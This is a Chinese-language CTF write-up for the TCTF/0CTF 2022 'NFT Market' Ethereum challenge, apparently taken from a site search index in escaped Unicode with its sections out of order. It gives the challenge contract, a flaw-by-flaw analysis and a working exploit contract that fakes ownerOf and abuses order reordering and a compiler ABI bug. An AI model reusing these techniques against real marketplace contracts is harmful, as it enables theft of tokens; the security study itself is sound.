3 \u53f7\u4ee3\u5e01 \u8fd9\u6837\u56de\u5230 purchaseWithCoupon \u65b9\u6cd5\u4e4b\u540e\u53d6\u51fa\u4e86\u8ba2\u5355\uff08\u552e\u5356\u7684 tokenId \u662f 3\uff0cnftAddress \u4e5f\u662f\u5546\u573a\u4e2d\u7684 NFT \u5730\u5740\uff09\u4ed8\u6b3e\u53ea\u9700\u4ed8 coupon.newprice \u8fd9\u4e48\u591a\u5c31\u53ef\u4ee5\u5f97\u5230 3 \u53f7\u4ee3\u5e01\u3002 \u4e71\u5e8f\u7684\u65b9\u6cd5\u662f\uff1a \u8d77\u59cb\uff1a1 2 3 \u589e\u52a0\u4e00\u4e2a\u81ea\u5df1\u7684\uff1a1 2 3 4 \u4e70\u4e0b 2\uff1a1 4 3\uff08\u6b64\u65f6\u81ea\u5df1\u7684\u8ba2\u5355\u5728 3 \u524d\uff09 \u4e0d\u8fc7\u4e0a\u9762\u8fd9\u4e2a\u65b9\u6cd5\u662f\u6709\u95ee\u9898\u7684\uff0c\u4fee\u6539 ownerOf \u5728\u5176\u4e2d\u5220\u9664\u8ba2\u5355\u7684\u8bdd\u4f1a\u5bfc\u81f4\u8fd9\u4e2a\u65b9\u6cd5\u5e76\u4e0d\u662f view \u65b9\u6cd5\uff0c\u9700\u8981\u4f7f\u7528 call \u800c\u4e0d\u662f staticcall \u8c03\u7528\u3002\u4f46\u662f\u901a\u8fc7 IERC721 \u5f97\u5230\u7684\u63a5\u53e3\u662f view \u7684\uff0c\u4f1a\u4f7f\u7528 staticcall \u8c03\u7528\uff0c\u4ece\u800c\u5bfc\u81f4 revert \u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u5173\u952e\u5728\u4e8e\u9898\u76ee\u6307\u5b9a\u4e86 solidity \u7f16\u8bd1\u5668\u7248\u672c\u4e3a 0.8.15\u3002\u8fd9\u4e2a\u7248\u672c\u7684\u7f16\u8bd1\u5668\u5b58\u5728\u4e00\u4e2a bug\u3002\u6765\u81ea solidity 0.8.16 release post \uff1a Important Bugfixes: Code Generation: Fix data corruption that affected ABI-encoding of calldata values represented by tuples: structs at any nesting level; argument lists of external functions, events and errors; return value lists of external functions. The 32 leading bytes of the first dynamically-encoded value in the tuple would get zeroed when the last component contained a statically-encoded array. \u6362\u53e5\u8bdd\u8bf4\u5c31\u662f\u5728\u8c03\u7528 verifyCoupon \u65b9\u6cd5\u65f6\u5176\u63a5\u6536\u5230\u7684 scoupon \u7684\u524d 32 \u5b57\u8282\u4f1a\u53d8\u6210\u5168 0\uff0c\u800c\u5bf9\u5e94\u7ed3\u6784\u4f53\u4e2d\u8fd9\u4e2a\u4f4d\u7f6e\u521a\u597d\u662f orderId\uff0c\u8fd9\u5c31\u5bfc\u81f4\u4e86\u65e0\u8bba\u5982\u4f55 verifyCoupon \u7684\u59cb\u7ec8\u662f\u7b2c\u4e00\u4e2a\u8ba2\u5355\u4e0a\u7684\u4fe1\u606f\u3002\u56e0\u6b64\u6211\u4eec\u8ba2\u5355\u5217\u8868\u7684\u987a\u5e8f\u5c31\u53ef\u4ee5\u662f\uff1a \u521d\u59cb\uff1a1 2 3 \u65b0\u5efa\uff1a1 2 3 4 \u4e70\u4e0b 1\uff1a4 2 3 \u4e70\u4e0b 2: 4 3 \u6240\u4ee5\u6700\u7ec8\u9a8c\u8bc1\u7684\u8fd8\u662f\u6211\u4eec\u81ea\u5df1\u8ba2\u5355\u4e0a\u7684\u4fe1\u606f\uff0c\u800c owner \u539f\u672c\u662f\u653b\u51fb\u5408\u7ea6\uff0c\u4e0d\u8fc7\u7b7e\u7f72\u8005\u53ea\u80fd\u662f\u7528\u6237\u8d26\u6237\uff0c\u6240\u4ee5\u9700\u8981\u4f2a\u9020\u4e00\u4e0b\uff0c\u7528\u4e00\u4e2a\u7528\u6237\u8d26\u6237\u7b7e\u7f72\u5f97\u5230\u7b7e\u540d\uff0c\u5e76\u5728 ownerOf \u7684\u65f6\u5019\u8fd4\u56de\u8fd9\u4e2a\u7b7e\u7f72\u8005\u5730\u5740\uff08\u8fd9\u6837 ownerOf \u65b9\u6cd5\u8fd8\u662f view \u7684\uff0c\u53ef\u4ee5 staticcall\uff09 \u6838\u5fc3\u4ee3\u7801 ExploitNFT contract ExploitNFT is Context , ERC165 { ... address public fake_issuer ; function set_fake_issuer ( address src ) public { fake_issuer = src ; } function ownerOf ( uint256 tokenId ) public virtual returns ( address ) { if ( fake_issuer != address ( this )) { address fake = fake_issuer ; return fake ; } else { address owner = _owners [ tokenId ]; return owner ; } } ... } Exploit contract Exploit { TctfMarket public market ; TctfNFT public myNFT ; ExploitNFT public expNFT ; address public issuer ; constructor ( address chal , address issuer_ ) { issuer = issuer_ ; market = TctfMarket ( chal ); myNFT = new TctfNFT (); expNFT = new ExploitNFT ( \"ExploitNFT\" , \"ENFT\" , chal ); } function airdrop () public { market . tctfToken (). airdrop (); } function buyToken1 () public returns ( bool ) { market . tctfToken (). approve ( address ( market ), 1 ); market . purchaseOrder ( 0 ); return market . tctfNFT (). ownerOf ( 1 ) == address ( this ); } function getTokenFromMarket () public { myNFT . mint ( address ( this ), 1 ); myNFT . setApprovalForAll ( address ( market ), true ); market . purchaseTest ( address ( myNFT ), 1 , 1337 ); } function buyToken2 () public returns ( bool ) { market . tctfToken (). approve ( address ( market ), 1337 ); market . purchaseOrder ( 1 ); return market . tctfNFT (). ownerOf ( 2 ) == address ( this ); } function createNewOrder () public { expNFT . mint ( address ( this ), 1 ); market . createOrder ( address ( expNFT ), 1 , 1 ); } function buyToken3 ( uint8 v , bytes32 [ 2 ] calldata rs ) public returns ( bool ) { market . tctfToken (). approve ( address ( market ), 1 ); expNFT . setApprovalForAll ( address ( market ), true ); expNFT . set_fake_issuer ( issuer ); require ( market . getOrder ( 0 ). nftAddress == address ( expNFT ), \"not valid\" ); require ( market . getOrder ( 1 ). nftAddress == address ( market . tctfNFT ()), \"not valid\" ); require ( address ( market . tctfNFT ()) != address ( expNFT ), \"not valid\" ); market . purchaseWithCoupon ( SignedCoupon ( Coupon ( 1 , // orderId 1 , // newprice issuer , // issuer address ( this ), // user bytes ( \"exploit\" ) ), Signature ( v , rs ) )); return market . tctfNFT (). ownerOf ( 3 ) == address ( this ); } function getSerialized () public returns ( bytes32 ) { Coupon memory coupon ; Order memory order ; order . nftAddress = address ( expNFT ); order . tokenId = 1 ; order . price = 1 ; coupon . user = address ( this ); coupon . issuer = issuer ; coupon . newprice = 1 ; coupon . reason = bytes ( \"exploit\" ); bytes memory serialized = abi . encode ( \"I, the issuer\" , coupon . issuer , \"offer a special discount for\" , coupon . user , \"to buy\" , order , \"at\" , coupon . newprice , \"because\" , coupon . reason ); return keccak256 ( serialized ); } function check ( uint8 v , bytes32 [ 2 ] calldata rs ) public returns ( bool ) { return ecrecover ( getSerialized (), v , rs [ 0 ], rs [ 1 ]) == issuer ; } function exp1 () public returns ( bool ) { airdrop (); createNewOrder (); getTokenFromMarket (); if ( ! buyToken1 ()) return false ; if ( ! buyToken2 ()) return false ; return true ; } function exp2 ( uint8 v , bytes32 [ 2 ] calldata rs ) public returns ( bool ) { if ( ! buyToken3 ( v , rs )) return false ; market . win (); return true ; } function onERC721Received ( address , address , uint256 , bytes memory ) public pure returns ( bytes4 ) { return this . onERC721Received . selector ; } } \u518d\u914d\u5408 web3.py \u8fdb\u884c\u4ea4\u4e92\u5373\u53ef\uff08\u7b7e\u7f72\u4e5f\u5728\u8fd9\u91cc\u5b8c\u6210\uff09 flag: flag{off_by_null_in_the_market_d711fbd6a7c0c015b42d}","title":"TCTF/0CTF 2022"},{"location":"writeups/tctf2022/#tctf0ctf-2022-risingstar-writeup","text":"Abstract TCTF/0CTF 2022 \u7684\u65b0\u661f\u8d5b\u9053\u548c\u56fd\u9645\u8d5b\u9053\uff0cmisc \u9898\u6709\u56db\u9053\u662f\u540c\u4e00\u4e2a\u9644\u4ef6\u7684\u56db\u4e2a flag\uff0c\u5f88 reverse\uff0c\u6ca1\u600e\u4e48\u505a\u3002\u53ea\u548c\u56db\u8001\u5e08\u4e00\u8d77\u505a\u4e86 ETH \u7684\u9898\uff0c\u8fd8\u662f\u6bd4\u8f83\u6709\u8da3\u7684","title":"TCTF/0CTF 2022 RisingStar Writeup"},{"location":"writeups/tctf2022/#tctf-nft-market","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.15 ; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\" ; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import \"@openzeppelin/contracts/access/Ownable.sol\" ; contract TctfNFT is ERC721 , Ownable { constructor () ERC721 ( \"TctfNFT\" , \"TNFT\" ) { _setApprovalForAll ( address ( this ), msg.sender , true ); } function mint ( address to , uint256 tokenId ) external onlyOwner { _mint ( to , tokenId ); } } contract TctfToken is ERC20 { bool airdropped ; constructor () ERC20 ( \"TctfToken\" , \"TTK\" ) { _mint ( address ( this ), 100000000000 ); _mint ( msg.sender , 1337 ); } function airdrop () external { require ( ! airdropped , \"Already airdropped\" ); airdropped = true ; _mint ( msg.sender , 5 ); } } struct Order { address nftAddress ; uint256 tokenId ; uint256 price ; } struct Coupon { uint256 orderId ; uint256 newprice ; address issuer ; address user ; bytes reason ; } struct Signature { uint8 v ; bytes32 [ 2 ] rs ; } struct SignedCoupon { Coupon coupon ; Signature signature ; } contract TctfMarket { event SendFlag (); event NFTListed ( address indexed seller , address indexed nftAddress , uint256 indexed tokenId , uint256 price ); event NFTCanceled ( address indexed seller , address indexed nftAddress , uint256 indexed tokenId ); event NFTBought ( address indexed buyer , address indexed nftAddress , uint256 indexed tokenId , uint256 price ); bool tested ; TctfNFT public tctfNFT ; TctfToken public tctfToken ; CouponVerifierBeta public verifier ; Order [] orders ; constructor () { tctfToken = new TctfToken (); tctfToken . approve ( address ( this ), type ( uint256 ). max ); tctfNFT = new TctfNFT (); tctfNFT . mint ( address ( tctfNFT ), 1 ); tctfNFT . mint ( address ( this ), 2 ); tctfNFT . mint ( address ( this ), 3 ); verifier = new CouponVerifierBeta (); orders . push ( Order ( address ( tctfNFT ), 1 , 1 )); orders . push ( Order ( address ( tctfNFT ), 2 , 1337 )); orders . push ( Order ( address ( tctfNFT ), 3 , 13333333337 )); } function getOrder ( uint256 orderId ) public view returns ( Order memory order ) { require ( orderId < orders . length , \"Invalid orderId\" ); order = orders [ orderId ]; } function createOrder ( address nftAddress , uint256 tokenId , uint256 price ) external returns ( uint256 ) { require ( price > 0 , \"Invalid price\" ); require ( isNFTApprovedOrOwner ( nftAddress , msg.sender , tokenId ), \"Not owner\" ); orders . push ( Order ( nftAddress , tokenId , price )); emit NFTListed ( msg.sender , nftAddress , tokenId , price ); return orders . length - 1 ; } function cancelOrder ( uint256 orderId ) external { Order memory order = getOrder ( orderId ); require ( isNFTApprovedOrOwner ( order . nftAddress , msg.sender , order . tokenId ), \"Not owner\" ); _deleteOrder ( orderId ); emit NFTCanceled ( msg.sender , order . nftAddress , order . tokenId ); } function purchaseOrder ( uint256 orderId ) external { Order memory order = getOrder ( orderId ); _deleteOrder ( orderId ); IERC721 nft = IERC721 ( order . nftAddress ); address owner = nft . ownerOf ( order . tokenId ); tctfToken . transferFrom ( msg.sender , owner , order . price ); nft . safeTransferFrom ( owner , msg.sender , order . tokenId ); emit NFTBought ( msg.sender , order . nftAddress , order . tokenId , order . price ); } function purchaseWithCoupon ( SignedCoupon calldata scoupon ) external { Coupon memory coupon = scoupon . coupon ; require ( coupon . user == msg.sender , \"Invalid user\" ); require ( coupon . newprice > 0 , \"Invalid price\" ); verifier . verifyCoupon ( scoupon ); Order memory order = getOrder ( coupon . orderId ); _deleteOrder ( coupon . orderId ); IERC721 nft = IERC721 ( order . nftAddress ); address owner = nft . ownerOf ( order . tokenId ); tctfToken . transferFrom ( coupon . user , owner , coupon . newprice ); nft . safeTransferFrom ( owner , coupon . user , order . tokenId ); emit NFTBought ( coupon . user , order . nftAddress , order . tokenId , coupon . newprice ); } function purchaseTest ( address nftAddress , uint256 tokenId , uint256 price ) external { require ( ! tested , \"Tested\" ); tested = true ; IERC721 nft = IERC721 ( nftAddress ); uint256 orderId = TctfMarket ( this ). createOrder ( nftAddress , tokenId , price ); nft . approve ( address ( this ), tokenId ); TctfMarket ( this ). purchaseOrder ( orderId ); } function win () external { require ( tctfNFT . ownerOf ( 1 ) == msg.sender && tctfNFT . ownerOf ( 2 ) == msg.sender && tctfNFT . ownerOf ( 3 ) == msg.sender ); emit SendFlag (); } function isNFTApprovedOrOwner ( address nftAddress , address spender , uint256 tokenId ) internal view returns ( bool ) { IERC721 nft = IERC721 ( nftAddress ); address owner = nft . ownerOf ( tokenId ); return ( spender == owner || nft . isApprovedForAll ( owner , spender ) || nft . getApproved ( tokenId ) == spender ); } function _deleteOrder ( uint256 orderId ) internal { orders [ orderId ] = orders [ orders . length - 1 ]; orders . pop (); } function onERC721Received ( address , address , uint256 , bytes memory ) public pure returns ( bytes4 ) { return this . onERC721Received . selector ; } } contract CouponVerifierBeta { TctfMarket market ; bool tested ; constructor () { market = TctfMarket ( msg.sender ); } function verifyCoupon ( SignedCoupon calldata scoupon ) public { require ( ! tested , \"Tested\" ); tested = true ; Coupon memory coupon = scoupon . coupon ; Signature memory sig = scoupon . signature ; Order memory order = market . getOrder ( coupon . orderId ); bytes memory serialized = abi . encode ( \"I, the issuer\" , coupon . issuer , \"offer a special discount for\" , coupon . user , \"to buy\" , order , \"at\" , coupon . newprice , \"because\" , coupon . reason ); IERC721 nft = IERC721 ( order . nftAddress ); address owner = nft . ownerOf ( order . tokenId ); require ( coupon . issuer == owner , \"Invalid issuer\" ); require ( ecrecover ( keccak256 ( serialized ), sig . v , sig . rs [ 0 ], sig . rs [ 1 ]) == coupon . issuer , \"Invalid signature\" ); } } \u5408\u7ea6\u5f88\u590d\u6742\uff0c\u4e0b\u9762\u8be6\u7ec6\u5206\u6790\u4e00\u4e0b\uff1a \u6709\u4e00\u4e2a\u57fa\u4e8e ERC20 \u7684\u4ee3\u5e01 TctfToken\uff08TTK\uff09 \u5728\u521b\u5efa\u65f6\u4f1a\u7ed9\u81ea\u5df1\u5408\u7ea6\u53d1\u653e 100000000000 \u4e2a\u4ee3\u5e01\uff0c\u7ed9\u90e8\u7f72\u8005\u53d1\u653e 1337 \u4e2a\u4ee3\u5e01 \u6709\u7a7a\u6295\u65b9\u6cd5\uff0c\u5916\u90e8\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\uff0c\u4e0d\u8fc7\u53ea\u80fd\u8c03\u7528\u4e00\u6b21\uff0c\u4e14\u4e00\u6b21\u53ea\u80fd\u83b7\u5f97 5 \u4e2a\u4ee3\u5e01 \u6709\u4e00\u4e2a\u57fa\u4e8e ERC721 \u7684\u975e\u540c\u8d28\u5316\u4ee3\u5e01\uff08NFT\uff09TctfNFT NFT \u7684\u5b9e\u8d28\u5c31\u662f\u53ef\u4ee5\u4e0b\u53d1\u5f88\u591a\u79cd\u4ee3\u5e01\uff08tokenId\uff09\uff0c\u4e0d\u8fc7\u6bcf\u79cd\u53ea\u80fd\u6709\u4e00\u4e2a\uff0c\u56e0\u6b64\u5728 mint \u7684\u65f6\u5019\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4ee3\u8868\u7684\u662f\u7f16\u53f7\u800c\u4e0d\u662f ERC20 \u4e2d\u7684\u6570\u91cf \u53ea\u6709 owner \u53ef\u4ee5\u4e0b\u53d1\u65b0\u4ee3\u5e01 \u6709\u4e00\u4e9b\u7ed3\u6784\u4f53 Order\uff1a\u4fdd\u5b58\u4e86\u8ba2\u5355\u4fe1\u606f\uff0c\u5305\u542b NFT \u5408\u7ea6\u5730\u5740\u3001\u552e\u5356\u7684\u4ee3\u5e01 id\u3001\u552e\u5356\u7684\u4ef7\u683c Coupon\uff1a\u4fdd\u5b58\u4e86\u4e00\u4e2a\u4f18\u60e0\u5238\uff0c\u5305\u542b\u4e86\u8ba2\u5355\u7f16\u53f7\u3001\u4f18\u60e0\u540e\u7684\u4ef7\u683c\u3001\u4e0b\u53d1\u4f18\u60e0\u5238\u7684\u8d26\u6237\u5730\u5740\u3001\u4f7f\u7528\u4f18\u60e0\u5238\u7684\u8d26\u6237\u5730\u5740\u3001\u4f18\u60e0\u7406\u7531 \u26a0\ufe0f \u8fd9\u91cc\u6709\u4e00\u4e2a\u53ef\u7591\u7684\u5730\u65b9\uff0c\u5b83\u4fdd\u5b58\u7684\u662f\u8ba2\u5355\u7f16\u53f7\u800c\u4e0d\u662f\u4ee3\u5e01\u7f16\u53f7\uff0c\u4f1a\u51fa\u73b0\u95ee\u9898 Signature\uff1a\u4fdd\u5b58\u4e86\u7b7e\u540d\u4fe1\u606f\uff08web3 \u7b7e\u540d\u5f97\u5230\u7684 v\u3001r\u3001s\uff09 SignedCoupon\uff1a\u4fdd\u5b58\u4e86\u4e00\u4e2a\u4f18\u60e0\u5238\u548c\u5bf9\u5e94\u7684\u7b7e\u540d \u6709\u4e00\u4e2a\u4ea4\u6613\u5546\u573a\u5408\u7ea6 TctfMarket \u6784\u9020\u65b9\u6cd5\uff1a \u5148\u521b\u5efa\u4e00\u4e2a TctfToken \u5408\u7ea6\u8d26\u6237\uff0c\u5e76\u5141\u8bb8\u5f53\u524d\u5546\u573a\u5408\u7ea6\u4efb\u610f\u4f7f\u7528\u6240\u62e5\u6709\u7684\u4ee3\u5e01 \u5f53\u524d\u5546\u573a\u56e0\u4e3a\u90e8\u7f72\u4e86\u5408\u7ea6\u4f1a\u88ab\u5206\u5230 1337 TTK \u7136\u540e\u521b\u5efa\u4e00\u4e2a TctfNFT \u5408\u7ea6\u8d26\u6237\uff0c\u5e76\u4e0b\u53d1\u4e09\u4e2a NFT \u4ee3\u5e01\uff1a 1 \u53f7 NFT \u53d1\u653e\u7ed9 TctfNFT \u5408\u7ea6\u8d26\u6237 2 \u53f7\u30013 \u53f7 NFT \u53d1\u653e\u7ed9\u5f53\u524d\u5546\u573a\u8d26\u6237 \u521b\u5efa\u4e00\u4e2a verifier\uff08\u540e\u9762\u518d\u5206\u6790\uff09 \u521b\u5efa\u4e09\u4e2a\u8ba2\u5355\uff1a 1 \u53f7\u4ee3\u5e01\u4ee5 1 TTK \u7684\u4ef7\u683c\u552e\u5356\uff08airdrop \u4e4b\u540e\u53ef\u4ee5\u76f4\u63a5\u8d2d\u4e70\uff09 2 \u53f7\u4ee3\u5e01\u4ee5 1337 TTK \u7684\u4ef7\u683c\u552e\u5356 \u26a0\ufe0f \u7ed3\u5408\u524d\u9762\u5546\u573a\u5f97\u5230\u4e86 1337 TTK \u7684\u6697\u793a\uff0c\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u4ee3\u5e01\u9700\u8981\u5148\u9a97\u53d6\u5546\u573a\u7684\u94b1 3 \u53f7\u4ee3\u5e01\u4ee5 13333333337 TTK \u7684\u4ef7\u683c\u552e\u5356 \u26a0\ufe0f \u4ef7\u683c\u5f88\u9ad8\uff0c\u6240\u4ee5\u53ef\u4ee5\u731c\u5230\u9700\u8981\u4f7f\u7528\u4f18\u60e0\u5238\u6765\u964d\u4f4e\u4ef7\u683c \u901a\u8fc7\u65b9\u6cd5\uff1a win \u65b9\u6cd5\u4e2d\u5b9a\u4e49\uff08\u672b\u5c3e emit \u4e86 SendFlag \u4e8b\u4ef6\uff09 \u68c0\u67e5\u8c03\u7528\u8005\u662f\u5426\u62e5\u6709\u5168\u90e8\u4e09\u4e2a\u4ee3\u5e01\uff0c\u5982\u679c\u6709\u5219\u6210\u529f getOrder \u65b9\u6cd5\uff1a\u83b7\u53d6\u8ba2\u5355\uff0c\u4e0d\u5fc5\u591a\u8bf4 createOrder \u65b9\u6cd5 \u63a5\u6536\u4e00\u4e2a NFT \u5408\u7ea6\u8d26\u6237\u5730\u5740\uff0c\u552e\u5356\u7684 tokenId \u548c\u4ef7\u683c \u521b\u5efa\u8ba2\u5355\u7684\u8d26\u6237\uff08\u5373\u8c03\u7528\u6b64\u65b9\u6cd5\u7684\u8d26\u6237\uff09\u5fc5\u987b\u662f\u6240\u552e\u5356\u4ee3\u5e01\u7684 owner\uff0c\u6216\u8005\u88ab\u6240\u6709\u8005\u8d4b\u4e88\u4e86\u7ba1\u7406\u6b64\u4ee3\u5e01\u7684\u6743\u9650\uff0c\u6216\u8005\u88ab\u6240\u6709\u8005\u8d4b\u4e88\u4e86\u7ba1\u7406\u4ed6\u6240\u6709\u4ee3\u5e01\u7684\u6743\u9650\uff08\u5728 isNFTApprovedOrOwner \u65b9\u6cd5\u4e2d\u68c0\u67e5\uff09 \u26a0\ufe0f \u6b64\u5904\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u521b\u5efa\u8ba2\u5355\u7684 NFT \u5408\u7ea6\u5730\u5740\u5e76\u6ca1\u6709\u786c\u7f16\u7801\u4e3a\u5546\u573a\u521b\u5efa\u7684 NFT \u5730\u5740\uff0c\u800c\u662f\u53ef\u4ee5\u901a\u8fc7\u7528\u6237\u81ea\u884c\u8f93\u5165\uff0c\u4f1a\u6709\u95ee\u9898 \u26a0\ufe0f \u6b64\u5904\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u662f external \u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u5916\u90e8\u7684\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u521b\u5efa\u8ba2\u5355 cancelOrder \u65b9\u6cd5 \u548c createOrder \u65b9\u6cd5\u540c\u6837\u68c0\u67e5\u4e86\u6743\u9650 \u8c03\u7528\u4e86 internal \u7684 _deleteOrder \u65b9\u6cd5\uff1a \u5c06\u672b\u5c3e\u7684\u8ba2\u5355\u79fb\u52a8\u5230\u5f53\u524d\u8981\u5220\u9664\u7684\u4f4d\u7f6e\u7136\u540e\u5f39\u51fa\u672b\u5c3e\u8ba2\u5355 \u26a0\ufe0f \u8fd9\u91cc\u4f1a\u5bfc\u81f4\u8ba2\u5355\u987a\u5e8f\u4e71\u5e8f\uff0c\u7ed3\u5408\u524d\u9762\u4f18\u60e0\u5238\u4fdd\u5b58\u7684\u662f\u8ba2\u5355\u7f16\u53f7\uff0c\u4f1a\u5bfc\u81f4\u4f18\u60e0\u5238\u5b9e\u9645\u4f5c\u7528\u4ee3\u5e01\u53d1\u751f\u53d8\u5316\uff0c\u662f\u4e2a\u5927\u95ee\u9898 \u6709\u4e09\u79cd\u652f\u4ed8\u8ba2\u5355\uff08\u8d2d\u4e70\u4ee3\u5e01\uff09\u7684\u65b9\u6cd5\uff1a purchaseOrder \u539f\u4ef7\u8d2d\u4e70\uff1a \u53ef\u4ee5\u8c03\u7528\u65e0\u9650\u6b21 \u76f4\u63a5\u652f\u4ed8\uff0c\u5148\u5220\u9664\u8ba2\u5355\u9632\u6b62\u91cd\u5165 \u5148\u4ece\u8c03\u7528\u8005\uff08\u4e70\u5bb6\uff09\u8f6c order.price \u4e2a TTK \u7ed9\u4ee3\u5e01\u6240\u6709\u8005 \u26a0\ufe0f \u8fd9\u91cc\u4e5f\u6709\u95ee\u9898\uff0cToken \u7684\u63a5\u6536\u65b9\u53ea\u4f1a\u662f owner\uff0c\u800c\u4e0d\u4f1a\u662f\u5176\u5b83\u88ab approved \u7684\u8d26\u6237\uff08\u6bd4\u5982\u8ba2\u5355\u521b\u5efa\u8005\uff09 \u518d\u4ece\u4ee3\u5e01\u6240\u6709\u8005\u8f6c\u51fa\u8fd9\u4e2a\u4ee3\u5e01\uff08order.tokenId\uff09\u7ed9\u8c03\u7528\u8005\uff08\u4e70\u5bb6\uff09 purchaseTest\uff1a \u53ea\u80fd\u8c03\u7528\u4e00\u6b21 \u26a0\ufe0f \u770b\u540d\u5b57\u662f\u6d4b\u8bd5\u7528\u65b9\u6cd5\uff0c\u5f88\u53ef\u7591\uff0c\u5e94\u8be5\u4f1a\u5305\u542b\u6f0f\u6d1e \u5177\u4f53\u903b\u8f91\u548c purchaseOrder \u5dee\u4e0d\u591a \u8c03\u7528\u8005\u53ef\u4ee5\u6307\u5b9a NFT \u5408\u7ea6\u5730\u5740\u3001tokenId \u548c\u4ef7\u683c \u5148\u521b\u5efa\u8ba2\u5355\u7136\u540e\u8df3\u7528 purchaseOrder \u8d2d\u4e70 purchaseWithCoupon \u4f7f\u7528\u4f18\u60e0\u5238\u8d2d\u4e70\uff1a \u53ea\u80fd\u8c03\u7528\u4e00\u6b21\uff08CouponVerifierBeta \u7684\u539f\u56e0\uff09 \u4f20\u5165\u4e00\u4e2a SignedCoupon \u901a\u8fc7 verifier.verifyCoupon \u9a8c\u8bc1\u6743\u9650\u548c\u7b7e\u540d \u901a\u8fc7 coupon.orderId \u53d6\u51fa\u8ba2\u5355\u5e76\u5220\u9664 \u26a0\ufe0f \u8fd9\u91cc\u6709\u95ee\u9898\uff0c\u53d6\u51fa\u8ba2\u5355\u7684\u64cd\u4f5c\u5728\u9a8c\u8bc1\u4e4b\u540e\uff0c\u5982\u679c\u80fd\u591f\u5728\u9a8c\u8bc1\u65f6\u641e\u4e9b\u624b\u6bb5\u5219\u53ef\u4ee5\u8ba9\u540e\u9762\u83b7\u5f97\u7684\u8ba2\u5355\u662f\u53e6\u4e00\u4e2a\u8ba2\u5355 \u4ee5 purchaseOrder \u540c\u6837\u903b\u8f91\u552e\u5356\uff08\u4ee5 coupon.newprice \u4ef7\u683c\uff09 onERC721Received \u65b9\u6cd5\uff1a \u9700\u8981\u8fd4\u56de selector \u6765\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u53ef\u7591\u63a5\u6536 ERC721 \u4ee3\u5e01\u7684\u5408\u7ea6\u8d26\u6237\uff08\u5728 safeTransferFrom \u65f6\u8c03\u7528\u68c0\u67e5\uff09 \u66fe\u7ecf\u6709\u6f0f\u6d1e\u662f\u5229\u7528\u8fd9\u4e2a\u51fd\u6570\u7684\u7279\u6027\u6765\u5728\u91cc\u9762\u641e\u5c0f\u52a8\u4f5c\u5b9e\u73b0\u91cd\u5165\u653b\u51fb\uff0c\u4e0d\u8fc7\u672c\u5408\u7ea6\u5df2\u7ecf\u9632\u6b62\u4e86\u91cd\u5165 \u6709\u4e00\u4e2a\u4f18\u60e0\u5238\u7b7e\u540d\u9a8c\u8bc1\u5408\u7ea6 CouponVerifierBeta\uff1a \u26a0\ufe0f \u540c\u6837\u540d\u5b57\u91cc\u5e26\u4e86 Beta\uff0c\u5f88\u53ef\u7591 verifyCoupon \u65b9\u6cd5\uff1a \u53ea\u80fd\u8c03\u7528\u4e00\u6b21 \u63a5\u6536\u4e00\u4e2a SignedCoupon \u53d6\u51fa coupon\u3001\u7b7e\u540d\u3001\u8ba2\u5355 \u6784\u9020 serialized bytes \u4fe1\u606f \u9a8c\u8bc1 issuer \u662f\u5426\u662f\u6240\u4f18\u60e0\u7684\u4ee3\u5e01\u7684 owner \u26a0\ufe0f \u6b64\u5904\u6709\u95ee\u9898\uff0c\u8c03\u7528\u4e86 NFT \u5730\u5740\u4e0a\u7684 ownerOf \u65b9\u6cd5\uff0c\u4e0d\u8fc7\u8fd9\u4e2a NFT \u5730\u5740\u53ef\u4ee5\u662f\u7528\u6237\u81ea\u884c\u521b\u5efa\u8ba2\u5355\u65f6\u6307\u5b9a\u7684\uff0c\u5176 ownerOf \u65b9\u6cd5\u4e5f\u5e76\u4e0d\u53ef\u4fe1 \u9a8c\u8bc1\u9488\u5bf9 keccak256(serialized) \u7684\u7b7e\u540d sig \u662f\u5426\u662f issuer \u7b7e\u7f72\u7684 \u5206\u6790\u4e0b\u6765\u5df2\u7ecf\u5f97\u5230\u4e86\u5f88\u591a\u7591\u70b9\u548c\u6709\u6f0f\u6d1e\u7684\u5730\u65b9\uff0c\u4e09\u4e2a\u4ee3\u5e01\u7684\u83b7\u53d6\u65b9\u6cd5\u4e5f\u5c31\u57fa\u672c\u6e05\u6670\u4e86\uff1a 1 \u53f7\u4ee3\u5e01\u901a\u8fc7 airdrop \u62ff\u5230 5 TTK \u540e\u53ef\u4ee5\u76f4\u63a5\u8d2d\u4e70 2 \u53f7\u4ee3\u5e01\u901a\u8fc7 purchaseTest \u65b9\u6cd5\u7684\u6f0f\u6d1e\u9a97\u53d6 1337 TTK \u540e\u8d2d\u4e70 \u5148\u521b\u5efa\u4e00\u4e2a\u81ea\u5df1\u7684 TctfNFT \u5408\u7ea6 \u7ed9\u81ea\u5df1\u53d1\u653e\u4e00\u4e2a\u4ee3\u5e01 \u5c06\u81ea\u5df1\u7684\u6743\u9650\u5168\u6743\u4ee3\u7406\u7ed9\u5546\u573a \u8c03\u7528 puchaseTest \u65b9\u6cd5\uff0c\u4f20\u5165\u81ea\u5df1\u5efa\u7684 NFT \u5408\u7ea6\u5730\u5740\u3001\u53d1\u653e\u7684\u4ee3\u5e01\u7f16\u53f7\u30011337 TTK \u7684\u4ef7\u683c \u8fd9\u65f6\u91cc\u9762\u4f1a\u521b\u5efa\u8fd9\u4e2a\u8ba2\u5355\u5e76\u4e14\u81ea\u5df1\u8d2d\u4e70 \u4e0d\u8fc7\u81ea\u5df1\u8d2d\u4e70\u65f6\u6536\u6b3e\u65b9\u5e76\u4e0d\u662f\u81ea\u5df1\uff0c\u800c\u662f\u8fd9\u4e2a\u4ee3\u5e01\u7684 owner\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u7684\u8d26\u6237\uff0c\u6240\u4ee5\u5c31\u9a97\u5230\u4e86 1337 TTK \uff08\u4e0d\u901a\u8fc7\u5df2\u4e70\u7684 1 